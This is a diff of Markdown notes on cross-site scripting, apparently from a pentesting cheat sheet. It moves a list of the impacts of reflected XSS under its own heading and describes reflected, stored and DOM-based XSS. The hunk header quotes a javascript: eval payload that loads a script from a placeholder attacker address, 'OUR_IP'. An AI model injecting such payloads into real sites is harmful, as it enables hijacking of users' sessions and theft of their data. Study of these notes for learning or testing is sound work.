@@ -39,19 +39,17 @@ javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\
 * Stored XSS, where the malicious script comes from the website's database.
 * DOM-based XSS, where the vulnerability exists in client-side code rather than server-side code.
 
-### Impact of Reflected XSS Attacks
-
-* Perform any action within the application that the user can perform.
-* View any information that the user is able to view.
-* Modify any information that the user is able to modify.
-* Initiate interactions with other application users, including malicious attacks, that will appear to originate from the initial victim user.
-
 ## Types of XSS
 
 ### Reflected XSS
 
 * Occurs when our input reaches the back-end server and gets returned to us without being filtered or sanitized.
 * Inject payloads in any entry point such as parameters, request body, url-parameters, HTTP Headers etc
+* #### Impact of Reflected XSS
+  * Perform any action within the application that the user can perform.
+  * View any information that the user is able to view.
+  * Modify any information that the user is able to modify.
+  * Initiate interactions with other application users, including malicious attacks, that will appear to originate from the initial victim user.
 
 ### Stored XSS
 
